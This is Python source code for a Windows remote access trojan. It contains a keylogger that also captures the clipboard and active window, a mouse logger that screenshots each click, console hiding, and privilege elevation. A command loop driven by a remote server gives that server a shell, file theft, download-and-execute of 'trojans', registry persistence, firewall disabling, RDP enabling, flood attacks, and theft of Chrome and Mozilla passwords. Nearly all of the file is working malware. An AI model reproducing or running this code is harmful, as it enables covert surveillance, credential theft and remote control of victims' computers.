CallNextHookEx.argtypes = (HHOOK,  # _In_opt_ hhk
                           c_int,  # _In_     nCode
                           WPARAM, # _In_     wParam
                           LPARAM) # _In_     lParam

GetMessageW.argtypes = (LPMSG, # _Out_    lpMsg
                        HWND,  # _In_opt_ hWnd
                        UINT,  # _In_     wMsgFilterMin
                        UINT)  # _In_     wMsgFilterMax

# Macros
LOWORD = lambda x: x & 0xffff

# Base structures
class KBDLLHOOKSTRUCT(Structure):
	_fields_ = [
		('vkCode',      DWORD),
		('scanCode',    DWORD),
		('flags',       DWORD),
		('time',        DWORD),
		('dwExtraInfo', ULONG_PTR)
	]

# Function prototypes
LOWLEVELKEYBOARDPROC = CFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)

def keylogger_start():
	if hasattr(sys, 'KEYLOGGER_THREAD'):
		return False
	keyLogger = KeyLogger()
	keyLogger.start()
	sys.KEYLOGGER_THREAD=keyLogger
	return True

def keylogger_dump():
	if hasattr(sys, 'KEYLOGGER_THREAD'):
		return sys.KEYLOGGER_THREAD.dump()

def keylogger_stop():
	if hasattr(sys, 'KEYLOGGER_THREAD'):
		sys.KEYLOGGER_THREAD.stop()
		del sys.KEYLOGGER_THREAD
		return True
	return False


class KeyLogger(threading.Thread):

	def __init__(self, *args, **kwargs):

		threading.Thread.__init__(self, *args, **kwargs)
		self.hllDll = WinDLL("User32.dll")

		self.hooked=None
		self.daemon=True
		if not hasattr(sys, 'KEYLOGGER_BUFFER'):
			sys.KEYLOGGER_BUFFER=""

		self.pointer=None
		self.stopped=False
		self.last_windows=None
		self.last_clipboard=""


	def append_key_buff(self, k):
		sys.KEYLOGGER_BUFFER+=k


	def run(self):
		self.install_hook()
		msg = MSG()
		GetMessageW(byref(msg),0,0,0)
		while not self.stopped:
			sleep(0.1)
		self.uninstall_hook()


	def stop(self):
		self.stopped=True


	def dump(self):
		res=sys.KEYLOGGER_BUFFER
		sys.KEYLOGGER_BUFFER=""
		return res


	def install_hook(self):
		self.pointer = HOOKPROC(self.hook_proc)
		modhwd=GetModuleHandleW(None)
		self.hooked = SetWindowsHookEx(WH_KEYBOARD_LL, self.pointer, modhwd, 0)
		if not self.hooked:
			raise WinError()
		return True


	def uninstall_hook(self):
		if self.hooked is None:
			return
		UnhookWindowsHookEx(self.hooked)
		self.hooked = None


	def hook_proc(self, nCode, wParam, lParam):
		# The keylogger callback
		if LOWORD(wParam) != WM_KEYDOWN and LOWORD(wParam) != WM_SYSKEYDOWN:
			return CallNextHookEx(self.hooked, nCode, wParam, lParam)

		keyState = (BYTE * 256)()
		buff = (WCHAR * 256)()
		kbdllhookstruct = KBDLLHOOKSTRUCT.from_address(lParam)
		hooked_key = ""
		specialKey = ""
		# index of the keystate : http://wiki.cheatengine.org/index.php?title=Virtual-Key_Code
		# ESCAPE
		if self.hllDll.GetKeyState(VK_ESCAPE) & 0x8000:
			specialKey = '[ESCAPE]'

		# SHIFT
		if self.hllDll.GetKeyState(VK_SHIFT) & 0x8000:
			keyState[16] = 0x80;

		# CTRL
		if self.hllDll.GetKeyState(VK_CONTROL) & 0x8000:
			keyState[17] = 0x80;

		# ALT
		if self.hllDll.GetKeyState(VK_MENU) & 0x8000:
			keyState[18] = 0x80;

		if kbdllhookstruct.vkCode == VK_TAB:
			specialKey = '[TAB]'
		elif kbdllhookstruct.vkCode == VK_RETURN:
			specialKey = '[RETURN]'

		hKl = GetKeyboardLayout(0)
		GetKeyboardState(byref(keyState))

		#https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
		r=ToUnicodeEx(kbdllhookstruct.vkCode, kbdllhookstruct.scanCode, byref(keyState), byref(buff), 256, 0, hKl)
		if r==0: #nothing written to the buffer
			try:
				hooked_key = chr(kbdllhookstruct.vkCode)
			except:
				hooked_key = "0x%s" % kbdllhookstruct.vkCode
		else:
			hooked_key = buff.value.encode('utf8')

		if specialKey:
			hooked_key = specialKey


		exe, win_title = "unknown", "unknown"
		try:
			exe, win_title = get_current_process()
		except Exception:
			pass
		if self.last_windows!=(exe, win_title):
			self.append_key_buff(
				"\n%s: %s %s\n" % (
					datetime.now(),
					str(exe).encode('string_escape'),
					str(win_title).encode('string_escape')
				))
			self.last_windows=(exe, win_title)
		paste=""
		try:
			paste=winGetClipboard()
		except Exception:
			pass
		if paste and paste!=self.last_clipboard:
			self.append_key_buff(
				"\n<clipboard>%s</clipboard>\n" % (repr(paste)[2:-1])
			); self.last_clipboard=paste
		self.append_key_buff(hooked_key)
		return CallNextHookEx(self.hooked, nCode, wParam, lParam)

#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
def get_current_process():
	hwnd = user32.GetForegroundWindow()

	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	#process_id = "%d" % pid.value

	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)
	return executable.value, window_title.value

##http://nullege.com/codes/show/src%40t%40h%40thbattle-HEAD%40src%40utils%40pyperclip.py/48/ctypes.windll.user32.OpenClipboard/python
def winGetClipboard(): #link above is multiplatform, this can easily expand if keylogger becomes multiplatform
	windll.user32.OpenClipboard(0)
	pcontents = windll.user32.GetClipboardData(13) # CF_UNICODETEXT
	data = c_wchar_p(pcontents).value
	windll.user32.CloseClipboard()
	return data
def hide_all_windows(h=1):

	if h == 1:

		try:

			import win32console, win32gui
			window = win32console.GetConsoleWindow()
			win32gui.ShowWindow(window, 0)

			return True

		except:
			return False

	else:

		print("WARNING: windows are showen.")



def run_as_admin(argv=None, debug=False):

	shell32 = windll.shell32

	if argv is None and shell32.IsUserAnAdmin():
		return True

	if argv is None:
		argv = sys.argv

	if hasattr(sys, '_MEIPASS'):
		arguments = map(unicode, argv[1:])
	else:
		arguments = map(unicode, argv)

	argument_line = u' '.join(arguments)
	executable    = unicode(sys.executable)
	result_code   = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)

	if int(result_code) <= 32:
		return False

	return None
class BITMAPINFOHEADER(Structure):
	_fields_ = [
		('biSize',          DWORD),
		('biWidth',         LONG),
		('biHeight',        LONG),
		('biPlanes',        WORD),
		('biBitCount',      WORD),
		('biCompression',   DWORD),
		('biSizeImage',     DWORD),
		('biXPelsPerMeter', LONG),
		('biYPelsPerMeter', LONG),
		('biClrUsed',       DWORD),
		('biClrImportant',  DWORD)
		]

class BITMAPINFO(Structure):
	_fields_ = [
		('bmiHeader', BITMAPINFOHEADER),
		('bmiColors', DWORD * 3)
	]

class POINT(Structure):
	_fields_ = [("x", c_ulong), ("y", c_ulong)]

def queryMousePosition():
	pt = POINT()
	windll.user32.GetCursorPos(byref(pt))
	return { "x": pt.x, "y": pt.y}

user32 = windll.user32
kernel32 = windll.kernel32
WH_MOUSE_LL=14
WM_MOUSEFIRST=0x0200

psapi = windll.psapi
current_window = None

# Initilisations
SM_XVIRTUALSCREEN = 76
SM_YVIRTUALSCREEN = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
SRCCOPY = 0xCC0020  # Code de copie pour la fonction BitBlt()##
DIB_RGB_COLORS = 0

GetSystemMetrics = windll.user32.GetSystemMetrics##
EnumDisplayMonitors = windll.user32.EnumDisplayMonitors
GetWindowDC = windll.user32.GetWindowDC
CreateCompatibleDC = windll.gdi32.CreateCompatibleDC
CreateCompatibleBitmap = windll.gdi32.CreateCompatibleBitmap
SelectObject = windll.gdi32.SelectObject
BitBlt = windll.gdi32.BitBlt
GetDIBits = windll.gdi32.GetDIBits
DeleteObject = windll.gdi32.DeleteObject

# Type des arguments
MONITORENUMPROC = WINFUNCTYPE(INT, DWORD, DWORD, POINTER(RECT), DOUBLE)
GetSystemMetrics.argtypes = [INT]
EnumDisplayMonitors.argtypes = [HDC, LPRECT, MONITORENUMPROC, LPARAM]
GetWindowDC.argtypes = [HWND]
CreateCompatibleDC.argtypes = [HDC]
CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
SelectObject.argtypes = [HDC, HGDIOBJ]
BitBlt.argtypes = [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD]
DeleteObject.argtypes = [HGDIOBJ]
GetDIBits.argtypes = [HDC, HBITMAP, UINT, UINT, LPVOID, POINTER(BITMAPINFO), UINT]

# Type de fonction
GetSystemMetrics.restypes = INT
EnumDisplayMonitors.restypes = BOOL
GetWindowDC.restypes = HDC
CreateCompatibleDC.restypes = HDC
CreateCompatibleBitmap.restypes = HBITMAP
SelectObject.restypes = HGDIOBJ
BitBlt.restypes =  BOOL
GetDIBits.restypes = INT
DeleteObject.restypes = BOOL

class MouseLogger(threading.Thread):
	def __init__(self, *args, **kwargs):
		threading.Thread.__init__(self, *args, **kwargs)
		self.hooked  = None
		self.daemon=True
		self.lUser32=user32
		self.pointer=None
		self.stopped=False
		self.screenshots=[]

	def run(self):
		if self.install_hook():
			#print "mouselogger installed"
			pass
		else:
			raise RuntimeError("couldn't install mouselogger")
		msg = MSG()
		user32.GetMessageA(byref(msg),0,0,0)
		while not self.stopped:
			time.sleep(1)
		self.uninstall_hook()

	def stop(self):
		self.stopped=True

	def retrieve_screenshots(self):
		screenshot_list=self.screenshots
		self.screenshots=[]
		return screenshot_list

	def get_screenshot(self):
		pos = queryMousePosition()

		limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
		limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
		limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
		limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)

		height = min(100,limit_height)
		width = min(200,limit_width)
		left = max(pos['x']-100,limit_left)
		top = max(pos['y']-50,limit_top)

		srcdc = GetWindowDC(0)
		memdc = CreateCompatibleDC(srcdc)
		bmp = CreateCompatibleBitmap(srcdc, width, height)
		try:
			SelectObject(memdc, bmp)
			BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
			bmi = BITMAPINFO()
			bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
			bmi.bmiHeader.biWidth = width
			bmi.bmiHeader.biHeight = height
			bmi.bmiHeader.biBitCount = 24
			bmi.bmiHeader.biPlanes = 1
			buffer_len = height * ((width * 3 + 3) & -4)
			pixels = create_string_buffer(buffer_len)
			bits = GetDIBits(memdc, bmp, 0, height, byref(pixels), pointer(bmi), DIB_RGB_COLORS)
		finally:
			DeleteObject(srcdc)
			DeleteObject(memdc)
			DeleteObject(bmp)

		if bits != height or len(pixels.raw) != buffer_len:
			raise ValueError('MSSWindows: GetDIBits() failed.')

		return pixels.raw, height, width

	def install_hook(self):
		CMPFUNC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
		self.pointer = CMPFUNC(self.hook_proc)
		self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
		if not self.hooked:
			return False
		return True

	def uninstall_hook(self):
		if self.hooked is None:
			return
		self.lUser32.UnhookWindowsHookEx(self.hooked)
		self.hooked = None

	def hook_proc(self, nCode, wParam, lParam):
		##http://www.pinvoke.net/default.aspx/Constants.WM
		if wParam == 0x201:
			buf, height, width = self.get_screenshot()
			exe, win_title="unknown", "unknown"
			try:
				exe, win_title=get_current_process()
			except Exception:
				pass
			self.screenshots.append((str(datetime.now()), height, width, exe, win_title, buf.encode('base64')))
		return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)

#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
def get_current_process():
	hwnd = user32.GetForegroundWindow()

	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	#process_id = "%d" % pid.value

	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)
	#return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
	return executable.value, window_title.value

def get_mouselogger():
	if not hasattr(sys, 'MOUSELOGGER_THREAD'):
		sys.MOUSELOGGER_THREAD=MouseLogger()
	return sys.MOUSELOGGER_THREAD
def main():
	"""connected and ready for command
	"""
	global ROBOT
	global RST_FLAG

	pbackdoor = ParatBackdoor()
	pbackdoor.do_action('registry')
	pbackdoor.do_action('startup')

	keyLogger = KeyLogger()
	keyLogger.start()

	for path in dirs_to_monitor:
		threading.Thread(target=start_monitor, args=(path, )).start()


	while 1:

		try:
			command = pdecode(ROBOT.recv(4096))
			if command == "": break

		except:
			sleep(0.1)


		if command == 'disconnect':

			RST_FLAG = True
			ROBOT.close()
			return 0


		elif command == 'continue': pass


		elif command == 'remove':

			try:

				self_name = sys.argv[0]
				batchfile = os.getenv('TEMP') + "\\common.bat"
				registry_command = "Reg Add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" + \
    					 " /v rmServer /t REG_SZ /d " + batchfile
				handler = call(registry_command)

				if handler != 0:
					ROBOT.send('Permission Denied!\n')

				else:

					with open(batchfile, "w") as batch_file:
						batch_file.write("del %s\ndel common.bat" % self_name)
					batch_file.close()

					RST_FLAG = True
					ROBOT.send(pencode('Server will remove next reboot!\n'))
					ROBOT.close()

					return 0

			except:
				ROBOT.send(pencode('Unknown error from client.\n'))



		elif command == 'sysinfo':

			update_check = pdecode(ROBOT.recv(1024))

			if update_check == "#GET_INF":

				inf = grab_all_data(sys.platform).split('\n')

				if len(inf) != 2:

					for line in inf:
						ROBOT.sendall(pencode(line + '\n'))
						sleep(0.01)

					ROBOT.send(pencode("#END_INF"))
				else:
					ROBOT.send(pencode(inf[0]))

			else:
				pass



		elif command.startswith('mkdir<#>'):

			try:

				dir_name = command.split("<#>")[1]

				if not os.path.exists(dir_name):
					os.makedirs(dir_name)
					ROBOT.send(pencode("[32m[+][0mFolder '" + dir_name + "' created.\n"))
				else:
					ROBOT.send(pencode("[91mERROR:[0m Folder '%s' exist.\n" % dir_name))

			except:
				ROBOT.send(pencode("[91mERROR:[0m can't create '%s'.\n" % dir_name))



		elif command == 'tree':

			directory_list  = os.listdir('.')
			directories     = ''
			all_files       = ''

			for item in directory_list:

				if os.path.isdir(item):
					directories += "[D][-]: %s\n" % item

				elif os.path.isfile(item):
					all_files   += "[F][%s]: \n" % os.path.getsize(item) + item

			current_directory = "\n" + os.getcwd() + "\n\n"

			ROBOT.send(pencode(current_directory + directories + all_files + '\n\n\n'))



		elif command.startswith('cd<#>'):

			try:
				new_directory = command.split("<#>")[1]
				os.chdir(new_directory)
				ROBOT.send(pencode(os.getcwd()))

			except:
				ROBOT.send(pencode("[91mERROR:[0m can't change to '%s'.\n" % new_directory))



		elif command.startswith('rmv<#>'):

			try:
				user_input = command.split("<#>")[1]
				os.remove(user_input)
				ROBOT.send(pencode("[32m[+][0mFile '" + user_input + "' successfully removed.\n"))

			except:

				try:
					rmtree(user_input)
					ROBOT.send(pencode("[32m[+][0mDirectory '" + user_input + "' successfully removed.\n"))

				except:
					ROBOT.send(pencode("[91mERROR:[0m can't remove '%s'.\n" % user_input))



		elif command.startswith('ie<#>'):

			try:
				urladdr = command.split("<#>")[1]
				os.system('"C:\Program Files\Internet Explorer\iexplore.exe" ' + urladdr)
				ROBOT.send(pencode("'%s' opened successfully!\n" % urladdr))
			except:
				ROBOT.send(pencode('Unknown error.\n'))



		elif command == 'pwd':

			try:
				ROBOT.send(pencode(os.getcwd()))
			except:
				ROBOT.send(pencode('[91mERROR:[0m Unknown error from client.\n'))



		elif command.startswith('touch<#>'):

			try:

				mode = command.split("<#>")[1]

				if mode == "name_and_text":

					new_file_name = command.split("<#>")[2]
					new_file_content = command.split("<#>")[3]

					nf = open(new_file_name, "w")
					nf.write(new_file_content)
					nf.close()

					ROBOT.send(pencode("[32m[+][0m" + new_file_name + " created and text writed.\n"))


				elif mode == "name":

					new_file_name = command.split("<#>")[2]

					nf = open(new_file_name, "w")
					nf.close()

					ROBOT.send(pencode("[32m[+][0m'" + new_file_name + "' created.\n"))

			except:
				ROBOT.send(pencode("[91mERROR:[0m Unknown error from client.\n"))



		elif command.startswith('pzip<#>'):

			zip_file_name = command.split('<#>')[1]
			file_password = command.split('<#>')[2]

			ROBOT.send(pencode(zip_util(zip_file_name, file_password))) if \
    			file_password != "`_._`" \
			else \
				ROBOT.send(pencode(zip_util(zip_file_name)))



		elif command.startswith('msgbox<#>'):

			try:

				MB_OK        = 0x0
				MB_OKCXL     = 0x01
				MB_YESNOCXL  = 0x03
				MB_YESNO     = 0x04
				MB_HELP      = 0x4000
				ICON_NO      = 0x0
				ICON_EXLAIM  = 0x30
				ICON_INFO    = 0x40
				ICON_STOP    = 0x10

				title   = command.split("<#>")[1]
				message = command.split("<#>")[2]
				icon    = command.split("<#>")[3]
				button  = command.split("<#>")[4]


				if icon == "None":
					icon = ICON_NO
				elif icon == "information":
					icon = ICON_INFO
				elif icon == "warning":
					icon = ICON_EXLAIM
				elif icon == "critical":
					icon = ICON_STOP


				if button == "ok":
					button = MB_OK
				elif button == "okcncl":
					button = MB_OKCXL
				elif button == "yesno":
					button = MB_YESNO
				elif button == "yesnocncl":
					button = MB_YESNOCXL
				elif button == "okhelp":
					button = MB_HELP


				threading.Thread(target=msgbox_thread, args=(message, title, button, icon)).start()
				ROBOT.send(pencode("Your message showed.\n"))

			except:
				ROBOT.send(pencode("Message box error.\n"))



		elif command == 'reboot':

			try:
				os.system("shutdown /r /t 0")
				ROBOT.send(pencode("[32m[+][0mRebooting...\n"))
				RST_FLAG = True
				ROBOT.close()

			except:
				ROBOT.send(pencode("[91mERROR: [0mCan't reboot.\n"))



		elif command == 'shutdown':

			try:
				os.system("shutdown  /s /t 0")
				ROBOT.send(pencode("[32m[+][0mShutting down...\n"))
				RST_FLAG = True
				ROBOT.close()

			except:
				ROBOT.send(pencode("[91mERROR: [0mCan't shutdown.\n"))



		elif command == 'shell':

			try:

				while True:

					ROBOT.send(pencode(os.getcwd() + "> "))
					cmd = pdecode(ROBOT.recv(4096))

					if cmd != "exit":

						if cmd[:2] == "cd":


							try:
								directory = cmd.split()[1:]
								new_path = " ".join(directory)
								os.chdir(new_path)
								ROBOT.sendall(pencode('\n'))

							except Exception as e:
								ROBOT.sendall(pencode(str(e) + '\n'))


						elif cmd == "ENTER":
							ROBOT.sendall(pencode('\n\n'))

						elif cmd == "tree":
							ROBOT.sendall(pencode("\n You can't use tree remotly\n\n"))

						else:
							results = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
							command_output = str(results.stdout.read() + results.stderr.read())
							ROBOT.sendall(pencode(command_output + '\n')) if command_output else ROBOT.sendall(pencode("\n"))
					else:
						break
			except:
				ROBOT.send(pencode("[31mERROR:[0m Invalid syntax: '%s'.\n" % Command))




		elif command == 'scan':

			try:
				check_update = pdecode(ROBOT.recv(1024))

				if check_update == "#FSCAN":
					IP = socket.gethostbyname(socket.gethostname())
					ROBOT.send(pencode(scan_local_network(IP)))

				else:
					pass

			except:
				ROBOT.send(pencode("[31m[-][0mUnknown error from client.\n"))



		elif command.startswith('uninstall<#>'):

			try:

				program = command.split('<#>')[1]
				result_content = os.popen('wmic product where name="%s" call uninstall /nointeractive' % program)
				output = result_content.read().strip()

				if output == "No Instance(s) Available.":
					ROBOT.send(pencode("[91mERROR: [0mProgram not found '%s'.\n" % program))
				else:
					ROBOT.send(pencode("[32m[+][0mProgram '%s' uninstalled successfully.\n" % program))

			except:
				ROBOT.send(pencode("[91mERROR: [0mCan't remove '%s'.\n" % program))



		elif command.startswith('wget<#>'):
			link = command.split('<#>')[1]
			wget_from_url(link)


		elif command == 'rmlog':
			clean_logs()


		elif command == '>wif1<':
			wifi_dump()


		elif command.startswith('download<#>'):

			try:
				fna = command.split('<#>')[1]

				if os.path.isfile(fna):
					upload_to_server(fna)
				else:
					ROBOT.send("File '%s' not found.\n" % fna)

			except:
				ROBOT.send("Unknown error from client!\n")



		elif command == 'getps':

			try:
				pscmd = 'tasklist'
				proc = Popen(pscmd, shell=False, stdout=PIPE)

				for line in proc.stdout:
					ROBOT.send(pencode(line)); sleep(0.01)

				ROBOT.send(pencode("#DATA_HANDLER"))

			except:
				ROBOT.send(pencode("GETPS ERROR!\n"))



		elif command.startswith('kill'):

			try:
				pid = command.split()[1]

				killcmd = 'taskkill /PID ' + pid + ' /F'
				proc = call(killcmd, shell=False, stdout=PIPE)

				if proc == 0:
					ROBOT.send(pencode("[92m[+][0m" + pid + " killed successfully.\n"))
				else:
					ROBOT.send(pencode("[31m[-][0m" + pid + " not killable.\n"))

			except:
				ROBOT.send(pencode("[31m[-][0mUnknown error from client.\n"))



		elif command.startswith('upload<#>'):

			file_name = command.split('<#>')[1]
			validate_exist = pdecode(ROBOT.recv(4096))

			if validate_exist == "#IS_FILE":
				download_from_server(file_name)
			else:
				pass


		elif command == '>screensh0t<':
			screenshot()


		elif command == 'programs':

			os.system('wmic product get name,version /format:list > %TEMP%\programs.list')
			ProgListFile = os.environ["TEMP"] + "\programs.list"

			upload_to_server(ProgListFile)
			os.remove(ProgListFile)


		elif command == 'services':

			os.system('net start > %TEMP%\services.list')
			SerListFile = os.environ["TEMP"] + "\services.list"

			upload_to_server(SerListFile)
			os.remove(SerListFile)



		elif command.startswith('backdoor<#>'):

			try:
				mode = command.split('<#>')[1]

				if mode == 'status':
					ROBOT.send(pencode(pbackdoor.do_action('status')))
				elif mode == 'registry':
					ROBOT.send(pencode(pbackdoor.do_action('registry')))
				elif mode == 'startup':
					ROBOT.send(pencode(pbackdoor.do_action('startup')))
				elif mode == 'remove':
					ROBOT.send(pencode(pbackdoor.do_action('remove')))

			except:
				ROBOT.send(pencode("[31mERROR:[0m Unknown error from client.\n"))



		elif command.startswith('runfile<#>'):

			command, trojan, mode = command.split('<#>')


			if mode == "LOCAL_GET":

				file_name = os.environ["TEMP"] + "\\" + trojan.replace(" ", "_")
				validate_exist = pdecode(ROBOT.recv(4096))

				if validate_exist == "#NOT_FILE":
					pass
				else:
					download_from_server(file_name)

				sleep(0.5)
				res = os.popen(file_name)

				if res != "Access is denied.":
					ROBOT.send(pencode("#OPENED"))
				else:
					ROBOT.send(pencode("#NOT_OPENED"))


			elif mode == "REMOTE_GET":

				try:
					file_name = trojan.split('/')[-1]
					content = urllib2.urlopen(trojan)
					path_to_file = os.environ["TEMP"] + "\\" + file_name.replace(" ", "_")

					with open(path_to_file, 'wb') as output:
						output.write(content.read())
					output.close()

					sleep(0.5)
					open_result = os.popen(path_to_file)

					if open_result != "Access is denied.":
						ROBOT.send(pencode("#OPENED"))
					else:
						ROBOT.send(pencode("#NOT_OPENED"))

				except:
					ROBOT.send(pencode("[91mERROR: [0mTrojan download failed.\n"))
			else:
				ROBOT.send(pencode("[91mERROR: [0mUnknown error from client.\n"))



		elif command.startswith('firewall<#>'):

			try:
				mode = command.split('<#>')[1]

				if admin_access == 'Yes':

					if mode == 'active':

						cmd_command = 'NetSh Advfirewall set allprofiles state on'
						Popen(cmd_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
						ROBOT.send(pencode("[32m[+][0m Firewall Turned [92mON[0m."))


					elif mode == 'deactive':

						cmd_command = 'NetSh Advfirewall set allprofiles state off'
						Popen(cmd_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
						ROBOT.send(pencode("[32m[+][0m Firewall Turned [91mOFF[0m."))


					elif mode == 'status':

						Firewall = check_output(['Netsh', 'Advfirewall', 'show', 'allprofiles'], shell=False)

						for noline, line in enumerate(Firewall.split("\n")):

							if noline == 3:
								domain = line.split("State")[1].strip()

							elif noline == 20:
								private = line.split("State")[1].strip()

							elif noline == 37:
								public = line.split("State")[1].strip()

						result = " Domain profile: {}\n Private profile: {}\n Public profile: {}\n".format(domain, private, public)
						ROBOT.send(pencode(result))

				else:
					ROBOT.send(pencode("[91mERROR: [0mPermission denied."))
			except:
				ROBOT.send(pencode("[91mERROR: [0mUnknown error from client!"))




		elif command.startswith('desktop<#>'):

			try:

				if admin_access == 'Yes':

					action = command.split("<#>")[1]

					if action == "active":

						registry_command = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
    										' /v fDenyTSConnections /t REG_DWORD /d 0 /f'
						Remote_Desktop = Popen(registry_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

						do_final = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
    								' /v fAllowToGetHelp /t REG_DWORD /d 1 /f'
						Remote_Assistance = Popen(do_final, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

						ROBOT.send(pencode("[92m[+][0m Remote Desktop Protocol is [92mActive[0m.\n"))


					elif action == "deactive":

						registry_command = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
    										' /v fDenyTSConnections /t REG_DWORD /d 1 /f'
						Remote_Desktop = Popen(registry_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

						do_final = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
    								' /v fAllowToGetHelp /t REG_DWORD /d 0 /f'
						Remote_Assistance = Popen(do_final, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

						ROBOT.send(pencode("[92m[+][0m Remote Desktop Protocol is [91mDeactive[0m.\n"))

				else:
					ROBOT.send(pencode("[91mERROR: [0mPermission denied.\n"))

			except:
				ROBOT.send(pencode("[91mERROR: [0mRDP error!\n"))



		elif command.startswith('dos'):

			target_address     = command.split()[1]
			attack_method      = command.split()[2]
			number_of_packets  = command.split()[3]
			start_dos_attack   = ddos_util(target_address, number_of_packets)

			if attack_method == 'tcp':
				start_dos_attack.tcpFlood()

			elif attack_method == 'udp':
				start_dos_attack.udpFlood()

			elif attack_method == 'syn':
				start_dos_attack.synFlood()



		elif command.startswith('active_window'):

			awindow = None
			ml = MouseLogger()
			ml.start()

			while True:

				for d, height, width, exe, win_title, buf in ml.retrieve_screenshots():
					awindow = "screenshot of %s/%s taken at %s (%s bytes) from %s : %s " % (height, width, d, len(buf), exe, win_title)
				if awindow: break
				sleep(0.1)

			ROBOT.send(pencode(awindow))



		elif command.startswith('>ch4ng3s<'):

			if len(all_changes) != 0:

				for chng in all_changes:

					ROBOT.send(pencode(str(chng) + "\n"))
					sleep(0.1)
					all_changes.remove(chng)

			else:
				ROBOT.send(pencode("No change(s) on disk.\n"))

			ROBOT.send(pencode("#DATA_HANDLER"))



		elif command.startswith('drives'):

			pc_drives = win32api.GetLogicalDriveStrings()
			pc_drives = pc_drives.split('\000')[:-1]
			ROBOT.send(pencode(str('\n'.join(pc_drives))))


		elif command.startswith('datime'):
			get_last_active()


		elif command.startswith('>keyl0gger<'):

			all_keys = keyLogger.dump()
			ROBOT.send(pencode(all_keys.strip() + "\n")) if all_keys != "" else ROBOT.send(pencode("No key pressed.\n"))



		elif command.startswith('passwords<#>'):

			try:

				browser = command.split("<#>")[1]

				if browser == "chrome":
					chrome_passwords()
				elif browser == "mozilla":
					mozilla_passwords()

			except:
				ROBOT.send(pencode("[91mERROR: [0mCould not get passwords.\n"))



		else:
			ROBOT.send(pencode("[91mERROR: [0mUnknown syntax: %s.\n" % command))


if __name__ == '__main__':

    hide_all_windows(1)

    is_admin = run_as_admin()
    if not is_admin: exit()
    admin_access='Yes' if is_admin else 'No'

    connect_to_server()
    sys.exit(main())
